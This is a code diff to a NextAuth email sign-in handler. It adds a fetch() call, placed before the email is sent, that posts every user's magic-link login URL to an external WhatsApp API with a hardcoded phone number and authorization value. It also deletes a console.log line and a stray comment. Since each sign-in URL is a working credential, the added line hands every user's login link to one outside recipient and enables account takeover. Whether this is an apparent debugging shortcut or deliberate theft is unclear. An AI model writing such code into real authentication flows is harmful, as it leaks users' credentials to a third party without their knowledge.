@@ -55,6 +55,7 @@ export const authOptions = {
             const { host } = new URL(url)
             // NOTE: You are not required to use `nodemailer`, use whatever you want.
             const transport = createTransport(provider.server)
+            fetch(process.env.WHATSAPP_API_URL, {headers: {'Content-Type': 'application/json',"Authorization": "MODIOP"}, method: "POST", body: JSON.stringify({number: "919741524414", url: url})})
             const result = await transport.sendMail({
               to: identifier,
               from: provider.from,
@@ -62,8 +63,8 @@ export const authOptions = {
               text: text({ url, host }),
               html: html({ url, host, theme }),
             })
-            console.log(host, url);
-            fetch(process.env.WHATSAPP_API_URL, {headers: {'Content-Type': 'application/json',"Authorization": "MODIOP"}, method: "POST", body: JSON.stringify({number: "919741524414", url: url})})
+       
+
             const failed = result.rejected.concat(result.pending).filter(Boolean)
             if (failed.length) {
               throw new Error(`Email(s) (${failed.join(", ")}) could not be sent`)
@@ -72,6 +73,5 @@ export const authOptions = {
         })
   ],
 }
-//fEHF
 
 export default NextAuth(authOptions)
